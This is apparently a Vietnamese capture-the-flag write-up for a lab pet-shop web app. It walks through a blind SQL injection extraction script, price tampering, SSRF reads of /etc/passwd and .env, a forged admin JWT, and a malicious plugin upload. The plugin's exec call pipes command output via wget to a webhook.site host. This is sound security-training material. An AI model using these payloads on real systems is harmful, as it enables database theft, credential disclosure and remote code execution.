@@ -1,0 +1,394 @@
+# SHOP THÚ CƯNG
+
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/banner.jpg"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+# Mở đầu
+
+Hôm nay chúng ta sẽ đến với một challenge khá thú vị.<br />
+Có 5 flag phải tìm:
+```
+flag1: khi mua thành công flag
+flag2: trong source code
+flag3: order detail của user conmeo
+flag4: trong database
+flag5: trong thư mục / ở server, tức yêu cầu phải rce được server
+```
+# Bắt đầu thôi
+Ban đầu khi mở trang web, ta thấy có nội dung đăng nhập, tạo tài khoản mới, quên mật khẩu.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/login.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Sau đó là vào homepage của trang web, nơi đây hiển thị các mặt hàng có thể mua. Quan sát nhanh thì thấy ta cần mua mặt hàng có tên là `Flag`, tuy nhiên giá của nó là tận 9999, trong khi số dư tài khoản của mình thì chỉ có 10.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/home.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Tiến hành mua thử mặt hàng khác xem sao.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/buy.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Tiếp đó, ta có thể vào chức năng xem danh sách các order và chi tiết.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/orders.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Cuối cùng là trang profile, tuy nhiên trang này đã bị khóa lại bởi admin.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/profile.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Theo như thông tin từ bên thiết kế challenge thì không cần subdomain scanning và port scanning, nên mình chỉ thử directory scanning xem sao. <br />
+Kết quả thu được một số file như `robots.txt`, hí hửng mở ra thì không có gì bên trong cả. 
+<br />
+
+Khi quan sát đoạn code html của trang chủ trong Burp, mình phát hiện 1 file js khá lạ: `/static/js/main.837350c0.js`. <br />
+Mở file này lên xem sao.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/frontend.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Google và GPT một lúc thì mình được kết quả đây là đoạn code frontend sau khi build của ứng dụng, có thể chứa các API frontend,...
+<br />
+Đặc biệt có một số endpoint đáng lưu ý:
+<br />
+
+1. `/api/v2/users/{id}/orders` -> đây là nơi xem chi tiết orders của một user nào đó, trong đó id có thể thay thành id của user khác. Tất nhiên không đơn giản như thế, trang web có sử dụng `X-Access-Token`, đây là một `jwt token`, nó yêu cầu phải có secret key để có thể giả mạo, tuy nhiên để đọc thì không cần.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/jwt.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+2. `/api/v2/plugins` -> endpoint này cho phép sử dụng cả 2 phương thức là GET và POST, rõ ràng là đẻ xem hay tải lên các plugin nào đó. Để truy cập các endpoint này thì ta cần đăng nhập với tư cách admin.
+
+3. `/api/v2/plugins/execute` -> đây khá chắc là nơi để thực hiện RCE (Flag 5) rồi. Nhưng mà để lấy được flag cuối đâu có dễ thế, ta vẫn cần quyền admin.
+
+4. `/admin` và `/admin/tickets` -> cũng yêu cầu là admin.
+<br />
+
+Giờ ta thử đi quan sát một số tính năng của ứng dụng xem sao.
+<br />
+Khi bắt đầu truy cập trang web, mình thấy có 3 trang `login`, `create account` và `forgot password`. Thử nhập các kí tự như `' " ( ),...` xem có lỗi gì không.<br />
+Kết quả là trong trang đăng nhập, đăng kí không hề có phản hồi gì đặc biệt, tuy nhiên ở trong chức năng quên tài khoản xuất hiện các biểu hiện lạ.
+<br />
+Nếu nhập vào enmail sẽ báo `This feature is not implemented yet`.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/reset_pass.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Nếu đưa vào `'` thì sẽ báo lỗi, trong Burp cũng hiện lỗi Internal Server Error
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/error.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Điều này chứng tỏ cơ chế lọc input của người dùng có vấn đề. Hơn thế nữa, nếu nhập vào một email nào đó (mà khá chắc chưa có ai tạo tài khoản với nó) thì ứng dụng báo `User not found`. <br />
+Điều này làm mình nghĩ tới chắc hẳn đây là một loại lỗi blind SQLi hoặc đại loại vậy rồi đây.
+<br />
+Phân tích một chút, nếu sử dụng input là `hanog@hanog.com' and 1 = 0 #` thì báo User not found, còn thay thành `1 = 1` thì lại This feature is not implemented yet.<br />
+Đến đây thì khá rõ ràng rồi, mình sẽ thiết kế payload có dạng `payload = "hanog@hanog.com' and '{c}' = lower(SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables), {index}, 1)) #"`. Trong đó `{c}` sẽ thành thành bộ kí tự abcd...0123 cho hợp lí. Chi tiết như sau:
+```
+import requests
+
+burp0_url = "https://musoe.cyberjutsu-lab.tech:443/api/v2/auth/forgot-password"
+burp0_headers = {"Sec-Ch-Ua-Platform": "\"Windows\"", "Accept-Language": "en-US,en;q=0.9", "Accept": "application/json, text/plain, */*", "Sec-Ch-Ua": "\"Not_A Brand\";v=\"99\", \"Chromium\";v=\"142\"", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36", "Origin": "https://musoe.cyberjutsu-lab.tech", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://musoe.cyberjutsu-lab.tech/forgot-password", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=1, i", "Connection": "keep-alive"}
+burp0_json={"email": "payload"}
+requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
+
+payload = "hanog@hanog.com' and '{c}' = lower(SUBSTR((SELECT group_concat(table_name) FROM information_schema.tables), {index}, 1)) #"
+table_names = ""
+last_table_names = ""
+for i in range(1, 1000):
+    for c in "abcdefghijklmnopqrstuvwxyz0123456789_,{}":
+        print(f"Trying character {c} at position {i}")
+        burp0_json={"email": payload.format(c=c, index=i)}
+        r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
+        if "This feature is not implemented yet" in r.text:
+            print(f"Found character at position {i}: {c}")
+            table_names += c
+            print("Current table names:", table_names)
+            break
+        elif "User not found" in r.text:
+            continue
+        else:
+            print("Unexpected response:", r.text)
+            exit(1)
+    if last_table_names == table_names:
+        print("No more characters found, ending.")
+        break
+    last_table_names = table_names
+
+
+# Final output
+# flags,orders,products,tickets,users
+```
+
+Tiếp đến thay payload thành : `payload = "hanog@hanog.com' and '{c}' = lower(SUBSTR((SELECT group_concat(column_name) FROM information_schema.columns where table_name='flags'), {index}, 1)) #"` thì tìm được tên cột. <br />
+Và <br />
+`payload = "hanog@hanog.com' and '{c}' = BINARY SUBSTR((SELECT flag FROM flags), {index}, 1) #"`
+<br />
+Như thế ta tìm luôn được flag số 4: `FLAG{76906e5c78c1f04???????3e4de23a77}` <br />
+Vẫn còn khai thác được, nhưng chưa biết chỗ dùng nên ta tạm dừng lại và xem xét cấc chức năng khác đã.
+<br />
+
+Tiếp theo, sau khi đặt mua thử 1 mặt hàng nào đó, quan sát trong Burp thì thấy gói tin.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/buy_burp.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Như thế, thử thay id thành 1, name thành Flag, price thành 0 thì ta mua được thật. <br />
+Có lẽ do server quá tin tưởng vào client nên thiếu cơ chế xử lý dữ liệu ở đây rồi.
+<br />
+Ta dễ dàng tìm được flag 1: `FLAG{ab413281962b????????51c05d2f2}`
+<br />
+
+Quan sát thêm thì cũng không thấy có chức năng gì đặc biệt nữa.<br />
+Theo kinh nghiệm mình thử mở mấy cái ảnh trong tab mới xem sao. và thu được `/api/v2/image/resize?image=http://webchallenge/files/images/products/3d46bb95acc186a7.png&size=large`.
+<br />
+Nhìn cũng khá giống SSRF rồi đó, thay phần url bên trong thành http://example.com thì thấy nó lấy được nội dung trang web về thật. Thử với `file:///etc/passwd` mình thu được kết quả:
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/etc_passwd.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Thừa thắng xông lên, mình truyền vào các file hệ thống như `/proc/self/environ` chẳng hạn và thu được một file quan trọng: `/usr/app/package.json`. Từ đây lại tìm ra `/usr/app/src/index.js` và một số depedencies của ứng dụng. Tra cứu thì thấy các phiên bản này chưa có CVE nào cả. Tiếp tục với file index.js thì thấy `/usr/app/src/.env`. Kết quả:
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/env.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Như vậy là tìm được flag 2: `FLAG{4d2c7fee2a055?????????29f019db}`
+<br />
+Trong file env này còn nhiều thông tin quý giá khác. Chẳng hạn như repo github kia chẳng hạn, nếu đó là source code của ứng dụng này thì chẳng phải challenge từ blackbox thành whitebox rồi sao.
+<br />
+Nhưng đời không như là mơ, truy cập vào thì nội dung trong đó đã bị gỡ bỏ rồi... Trời ơi...<br />
+Sau này khi xem lại mình mới biết thực chất challenge đến đây thực sự có thể đọc được source code thật, nhưng lúc mình làm thì bị gì đó dẫn tới mình phải làm blackbox toàn bộ.
+<br />
+Và thông tin quan trọng cuối cùng mình có thể khai thác chính là `JWT_SECRET`. Nếu các bạn còn nhớ ở trên mình đã tìm được một số endpoint có thể khai thác được nếu có thể tạo ra jwt token giả mạo.
+<br />
+Để làm giả được jwt token này mình còn cần nắm được cấu trúc của nội dung cần được mã hóa.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/jwt.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Giờ cần biết `id`, `username` và `role` là gì để tiến hành khai thác. Thực ra mình hoàn toàn có thể đoán được, vì id của mình là 4 rồi. Đề bài thì yêu cầu đọc order detail của 'conmeo', do đó id chắc cũng nhỏ nhỏ và role vẫn là user thôi.
+<br />
+Sau khi thử thì được thật.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/conmeo.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Ta có flag 3: `FLAG{da825564095d??????????3fe58c0}`
+<br />
+Đến đây, mình có 1 suy nghĩ: "Nếu người thiết kế challenge cố tình thay id và username thành gì đó lạ lạ thì sao". Để chắc chắn thì mình quay lại với lỗi SQLi bên trên, khai thác lại thông tin về bảng `users` và thu được một số kết quả.
+<br />
+Tổng kết lại mình có id của admin là 2, với role là admin luôn. Vậy là có jwt token giả: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc2NDM1NzMxMiwiZXhwIjoxNzY0OTYyMTEyfQ.vfdplvbxlKXUFoUDlMB2oTCv5eBz8uVfnS9PD_NEYKM`
+<br />
+Bây giờ vô dev tool, thay thế token thành token của mình, sửa luôn thông tin của user.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/admin_token.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+
+Giờ mình đã truy cập được admin panel, trong đó có phần `plugin` là đáng chú ý.
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/plugin.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+Ấn vào chạy thử plugin thì không thấy có gì xuất hiện ngoài thông báo thành công, cũng không tìm thấy cách nào để đưa plugin mới lên cả (nút thêm đã bị vô hiệu hóa). Mình tải plugin-example về xem sao:
+```
+module.exports = {
+  execute: () => {
+    console.log('Hello from the plugin!');
+  },
+};
+```
+Rõ ràng giờ chỉ cần upload được file js để chạy lệnh command là xong.
+<br />
+
+Lại nhớ lại phần trên, các bạn còn nhớ enpoint `/api/v2/plugin` với 2 phương thức GET và POST chứ?
+Nếu ta có thể đầy file js lên theo cách này, thế thì cụ thể gửi như thế nào?
+
+<br />
+
+Đến đây cũng hơi bí, và không biết khai thác gì tiếp theo, mình trở lại với lỗ hổng SSRF ở trên xem còn gì thú vị không, biết đâu tìm được file nào hay hay.
+
+<br />
+Sau khi thử một hồi thì cũng không có gì đặc biệt cả, nhưng có một điểm đáng chú ý, nếu mình đưa vào trong `file:///{đường dẫn tới file}` một đường dẫn không tồn tại sẽ trả về lỗi:
+<div style={{ display: 'flex', justifyContent: 'center', margin: '2rem 0' }}>
+  <img
+    src="/images/writeup/shop/ssrf_error.png"
+    alt="Ảnh minh họa"
+    style={{ width: '100%', maxWidth: '600px', height: 'auto', borderRadius: '8px' }}
+  />
+</div>
+File trên không có gì đặc biệt cả, nhưng mình có 1 câu hỏi: "Nếu xử lý ảnh dùng `imageController` thì xử lý plugin liệu có cần `pluginController` không?" Và kết quả là thu được thật.
+<br />
+```
+const path = require('path');
+const fs = require('fs');
+const errorHelpers = require('../helpers/errorHelpers');
+
+const PLUGINS_FOLDER = '/usr/uploads/plugins';
+
+async function getPlugins(req, res) {
+  try {
+    const plugins = fs.readdirSync(PLUGINS_FOLDER);
+    res.status(200).send({ plugins });
+  } catch (error) {
+    errorHelpers.handleError(error, res);
+  }
+}
+
+async function uploadPlugin(req, res) {
+  if (!req.files || !req.files.plugin) {
+    return res.status(400).json({ message: 'No file uploaded' });
+  }
+
+  const plugin = req.files.plugin;
+  const pluginName = plugin.name;
+  const pluginPath = path.join(PLUGINS_FOLDER, pluginName);
+
+  if (fs.existsSync(pluginPath)) {
+    return res.status(400).json({ message: 'Plugin already exists' });
+  }
+
+  try {
+    plugin.mv(pluginPath, (err) => {
+      if (err) {
+        console.error(err);
+        return res.status(500).json({ message: 'Internal server error' });
+      }
+      res.status(200).json({ message: 'Plugin uploaded successfully' });
+    });
+  } catch (error) {
+    errorHelpers.handleError(error, res);
+  }
+}
+
+async function executePlugin(req, res) {
+  const pluginName = req.body.pluginName;
+  if (!pluginName) {
+    return res.status(400).json({ message: 'pluginName is required' });
+  }
+
+  const pluginPath = path.join(PLUGINS_FOLDER, pluginName);
+
+  if (!fs.existsSync(pluginPath)) {
+    return res.status(404).json({ message: 'Plugin not found' });
+  }
+
+  try {
+    const plugin = require(pluginPath);
+    if (typeof plugin.execute === 'function') {
+      plugin.execute();
+      res.status(200).send({ message: 'Plugin executed successfully' });
+    } else {
+      res.status(400).send({ message: 'Invalid plugin format' });
+    }
+  } catch (error) {
+    errorHelpers.handleError(error, res);
+  }
+}
+
+module.exports = {
+  getPlugins,
+  uploadPlugin,
+  executePlugin
+};
+```
+
+Như thế rút ra được một số điều quan trọng:
+1. Backend dùng express-fileupload, do đó request phải là multipart/form-data
+2. `if (!req.files || !req.files.plugin) {` -> field name phải là plugin
+<br />
+Đến đây thì đơn giản rồi, mình dùng code python sau:
+```
+import requests
+
+burp0_url = "https://musoe.cyberjutsu-lab.tech/api/v1/plugins"
+burp0_headers = {
+    "X-Access-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc2MzkxMjIyNywiZXhwIjoxNzY0NTE3MDI3fQ.BC4yQh6vww2mav5qxEZVpB2MhW1k3QR9DsXkXFw9iv4"
+}
+
+plugin_path = 'code/rce.js'
+name_file = 'plugin.js'
+
+with open(plugin_path, 'rb') as f:
+    files = {
+        "plugin": (name_file, f, "multipart/form-data"),
+    }
+
+    result = requests.post(burp0_url, headers=burp0_headers, files=files)
+    print(result.text)
+
+```
+Trong đó plugin.js như sau:
+```
+const { exec } = require('child_process');
+
+module.exports = {
+  execute: () => {
+    exec('ls -l | wget --post-data="`cat`" https://webhook.site/36c992d6-a144-40f8-87d4-721650d90e2d');
+  },
+};
+
+```
+Tải plugin lên thành công, chạy thử và thấy Webhook có nội dung gửi về, từ đó mình tìm được folder và thay thế nội dung plugin trên để đọc file.
+<br />
+Flag 5: `FLAG{632f7879b5bea6??????e44e3943}`
